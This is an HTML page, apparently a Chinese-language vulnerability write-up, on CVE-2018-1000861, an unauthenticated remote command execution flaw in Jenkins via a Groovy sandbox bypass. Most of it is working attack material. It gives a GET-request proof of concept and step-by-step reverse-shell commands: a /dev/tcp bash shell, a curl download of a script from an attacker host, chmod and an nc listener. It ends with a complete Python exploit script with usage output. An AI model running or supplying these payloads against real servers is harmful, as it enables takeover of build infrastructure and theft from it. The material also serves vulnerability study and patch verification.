<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs6EDCDAE2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:italic;}
			.csBF12A472{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:italic;}
			.cs4B51D5E4{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs1C2E50E7{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs5BEC2C28{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="cve-2018-1000861jenkins-远程命令执行漏洞"><span class="csECDA2D3">（</span><span class="csDE05BCC">CVE-2018-1000861</span><span class="csECDA2D3">）</span><span class="csDE05BCC">Jenkins </span><span class="csECDA2D3">远程命令执行漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Jenkins</span><span class="cs9C1B1871">使用</span><span class="cs8926E06">Stapler</span><span class="cs9C1B1871">框架开发，其允许用户通过</span><span class="cs8926E06">URL PATH</span><span class="cs9C1B1871">来调用一次</span><span class="cs8926E06">public</span><span class="cs9C1B1871">方法。由于这个过程没有做限制，攻击者可以构造一些特殊的</span><span class="cs8926E06">PATH</span><span class="cs9C1B1871">来执行一些敏感的</span><span class="cs8926E06">Java</span><span class="cs9C1B1871">方法。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">通过这个漏洞，我们可以找到很多可供利用的利用链。其中最严重的就是绕过</span><span class="cs8926E06">Groovy</span><span class="cs9C1B1871">沙盒导致未授权用户可执行任意命令：</span><span class="cs8926E06">Jenkins</span><span class="cs9C1B1871">在沙盒中执行</span><span class="cs8926E06">Groovy</span><span class="cs9C1B1871">前会先检查脚本是否有错误，检查操作是没有沙盒的，攻击者可以通过</span><span class="cs8926E06">Meta-Programming</span><span class="cs9C1B1871">的方式，在检查这个步骤时执行任意命令。</span></p><h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Jenkins Version &lt;= 2.56</span></p><p class="cs40DD2BC9"><span class="cs8926E06">Jenkins LTS Version &lt;= 2.46.1</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h4 class="cs868C439D">
			<a name="漏洞复现"><span class="cs6EDCDAE2">漏洞复现</span><span class="csBF12A472">:</span></a></h4>
		<h5 class="cs868C439D">
			<a name="X31a86b08608f90a368cfe1f4e76831046614522"><span class="cs4B51D5E4">1.</span><span class="cs1C2E50E7">此漏洞是没有回显的</span><span class="cs4B51D5E4">,</span><span class="cs1C2E50E7">所以我们这里直接反弹</span><span class="cs4B51D5E4">shell:</span></a></h5>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">此漏洞的</span><span class="cs8926E06">POC(</span><span class="cs9C1B1871">直接</span><span class="cs8926E06">GET</span><span class="cs9C1B1871">请求即可</span><span class="cs8926E06">):</span></p><p class="cs3A447A38"><span class="cs9FB05234">GET /securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&amp;value=public%20class%20x%20{public%20x(){%22touch%20/tmp/CVE-2018-1000861_is_success%22.execute()}}</span></p><h5 class="cs868C439D">
			<a name="X057449a53c3a8167776ce3e93a1cc5b6d3362fe"><span class="cs4B51D5E4">2.</span><span class="cs1C2E50E7">我们这里采取下载文件的方法来反弹</span><span class="cs4B51D5E4">shell</span></a></h5>
		<p class="cs40DD2BC9"><span class="cs8926E06">(1) </span><span class="cs9C1B1871">先在我们的服务器上防止一个文本</span><span class="cs8926E06">,</span><span class="cs9C1B1871">内容为</span><span class="cs8926E06">:</span></p><p class="cs3A447A38"><span class="cs9FB05234">bash -i &gt;&amp; /dev/tcp/172.26.1.156/9999 0&gt;&amp;1</span></p><p class="cs40DD2BC9"><span class="cs8926E06">(2) </span><span class="cs9C1B1871">然后我们替换</span><span class="cs8926E06">POC</span><span class="cs9C1B1871">中执行命令的部分为下载文件的命令</span><span class="cs8926E06">:</span></p><p class="cs3A447A38"><span class="cs9FB05234">curl -o /tmp/1.sh http://172.26.1.156:8080/1.txt</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">替换后的</span><span class="cs8926E06">POC:</span></p><p class="cs3A447A38"><span class="cs9FB05234">http://172.26.1.129:8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&amp;value=public%20class%20x%20{public%20x(){%22curl+-o+/tmp/1.sh+http://172.26.1.156:8080/1.txt%22.execute()}}</span></p><p class="cs40DD2BC9"><span class="cs8926E06">(3) </span><span class="cs9C1B1871">给予下载的脚本执行权限</span><span class="cs8926E06">:</span></p><p class="cs3A447A38"><span class="cs9FB05234">chmod 777 /tmp/1.sh</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">替换后的</span><span class="cs8926E06">POC:</span></p><p class="cs3A447A38"><span class="cs9FB05234">http://172.26.1.129:8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&amp;value=public%20class%20x%20{public%20x(){%22chmod+777+/tmp/1.sh%22.execute()}}</span></p><p class="cs40DD2BC9"><span class="cs8926E06">(4) </span><span class="cs9C1B1871">然后在我们接收</span><span class="cs8926E06">shell</span><span class="cs9C1B1871">的机器上监听之前写的端口</span><span class="cs8926E06">:</span></p><p class="cs3A447A38"><span class="cs9FB05234">nc -lvvp 9999</span></p><p class="cs40DD2BC9"><span class="cs8926E06">(5) </span><span class="cs9C1B1871">直接</span><span class="cs8926E06">bash</span><span class="cs9C1B1871">执行我们下载的脚本</span></p><p class="cs3A447A38"><span class="cs9FB05234">bash /tmp/1.sh</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">替换后的</span><span class="cs8926E06">POC:</span></p><p class="cs3A447A38"><span class="cs9FB05234">http://172.26.1.129:8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&amp;value=public%20class%20x%20{public%20x(){%22bash+/tmp/1.sh%22.execute()}}</span></p><p class="cs40DD2BC9"><span class="cs8926E06">(6) </span><span class="cs9C1B1871">回到我们监听端口的机器</span><span class="cs8926E06">:</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Jenkins/%ef%bc%88CVE-2018-1000861%ef%bc%89Jenkins%20%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image0.jpg" width="560" height="420" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">可以看到已经成功获取到了</span><span class="cs8926E06">shell!</span></p><h3 class="cs868C439D">
			<a name="poc"><span class="csD1E291E2">poc</span></a></h3>
		<p class="cs40DD2BC9"><span class="cs5BEC2C28">useage</span></p><p class="cs3A447A38"><span class="cs9FB05234">$ curl -s -I http://jenkins/| grep X-Jenkins</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">X-Jenkins: 2.137</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">X-Jenkins-Session: 20f72c2e</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">X-Jenkins-CLI-Port: 50000</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">X-Jenkins-CLI2-Port: 50000</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">$ python exp.py http://jenkins/ &#39;curl orange.tw&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[*] ANONYMOUS_READ disable!</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[*] Bypass with CVE-2018-1000861!</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[*] Exploit success!(it should be :P)</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Jenkins/%ef%bc%88CVE-2018-1000861%ef%bc%89Jenkins%20%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image1.jpg" width="560" height="150" alt="" style="border-width:0px;" /></span></p><p class="cs3A447A38"><span class="cs9FB05234">#!/usr/bin/python</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># coding: UTF-8</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># author: Orange Tsai(@orange_8361)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># </span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">import sys</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import requests</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">from enum import Enum</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"># remove bad SSL warnings</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">try:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;requests.packages.urllib3.disable_warnings()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">except:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;pass</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">endpoint = &#39;descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript&#39;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">class mode(Enum):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;ACL_PATCHED = 0</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;NOT_JENKINS = 1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;READ_ENABLE = 2</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;READ_BYPASS = 3</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;ENTRY_NOTFOUND = 999</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">def usage():</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print &#39;&#39;&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;Usage:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;python exp.py &lt;url&gt; &lt;cmd&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&#39;&#39;&#39;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">def _log(msg, fail=False):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;nb = &#39;[*]&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if fail:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nb = &#39;[-]&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print &#39;%s %s&#39; % (nb, msg)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">def _get(url, params=None):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;r = requests.get(url, verify=False, params=params)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return r.status_code, r.content</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">def _add_bypass(url):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return url + &#39;securityRealm/user/admin/&#39;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">def check(url):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;flag, accessible = mode.ACL_PATCHED, False</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# check ANONYMOUS_READ</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;status, content = _get(url)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if status == 200 and &#39;adjuncts&#39; in content:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flag, accessible = mode.READ_ENABLE, True</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_log(&#39;ANONYMOUS_READ enable!&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;elif status == 403:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_log(&#39;ANONYMOUS_READ disable!&#39;)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# check ACL bypass, CVE-2018-1000861</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;status, content = _get(_add_bypass(url))</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if status == 200 and &#39;adjuncts&#39; in content:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flag, accessible = mode.READ_BYPASS, True</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flag = mode.NOT_JENKINS</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;# check entry point, CVE-2019-1003005</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if accessible:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if flag is mode.READ_BYPASS:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;url = _add_bypass(url)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;status, content = _get(url + endpoint)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if status == 404:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flag = mode.ENTRY_NOTFOUND</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return flag</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">def exploit(url, cmd):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;payload = &#39;public class x{public x(){new String(&quot;%s&quot;.decodeHex()).execute()}}&#39; % cmd.encode(&#39;hex&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;params = {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;sandbox&#39;: True, </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;value&#39;: payload</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;status, content = _get(url + endpoint, params)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if status == 200:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_log(&#39;Exploit success!(it should be :P)&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;elif status == 405:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_log(&#39;It seems Jenkins has patched the RCE gadget :(&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_log(&#39;Exploit fail with HTTP status [%d]&#39; % status, fail=True)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if &#39;stack trace&#39; in content:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for _ in content.splitlines():</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if _.startswith(&#39;Caused:&#39;):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_log(_, fail=True)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">if __name__ == &#39;__main__&#39;:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if len(sys.argv) != 3:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;usage()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit()</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;url = sys.argv[1].rstrip(&#39;/&#39;) + &#39;/&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;cmd = sys.argv[2]</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;flag = check(url)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if flag is mode.ACL_PATCHED:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_log(&#39;It seems Jenkins is up-to-date(&gt;2.137) :(&#39;, fail=True)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;elif flag is mode.NOT_JENKINS:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_log(&#39;Is this Jenkins?&#39;, fail=True)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;elif flag is mode.READ_ENABLE:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exploit(url, cmd)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;elif flag is mode.READ_BYPASS:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_log(&#39;Bypass with CVE-2018-1000861!&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exploit(_add_bypass(url), cmd)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;else:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;_log(&#39;The `checkScript` is not found, please try other entries(see refs)&#39;, fail=True)</span></p></body>
</html>
